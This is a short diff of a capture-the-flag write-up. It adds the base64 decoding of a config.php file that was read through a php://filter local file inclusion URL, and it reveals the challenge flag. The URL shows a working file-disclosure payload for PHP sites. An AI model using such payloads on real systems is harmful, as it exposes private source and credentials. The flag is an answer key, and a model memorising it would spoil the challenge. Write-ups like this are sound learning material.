@@ -15,7 +15,14 @@ https://extprotect.secu-web.blackfoot.dev/?lang=php://filter/convert.base64-enco
 
 Base64 config.php:
 ```
-PD9waHAKICAvLyBDb25ncmF0eiAhIEZMQUcgSVMgWk9CezN2M25fcHIwdF9jNG43X3N0MHBfbTN9Cj8+Cg== 
+PD9waHAKICAvLyBDb25ncmF0eiAhIEZMQUcgSVMgWk9CezN2M25fcHIwdF9jNG43X3N0MHBfbTN9Cj8+Cg==
+```
+
+Base64 decoded:
+```
+<?php
+  // Congratz ! FLAG IS ZOB{3v3n_pr0t_c4n7_st0p_m3}
+?>
 ```
 
 flag: ```ZOB{3v3n_pr0t_c4n7_st0p_m3}```
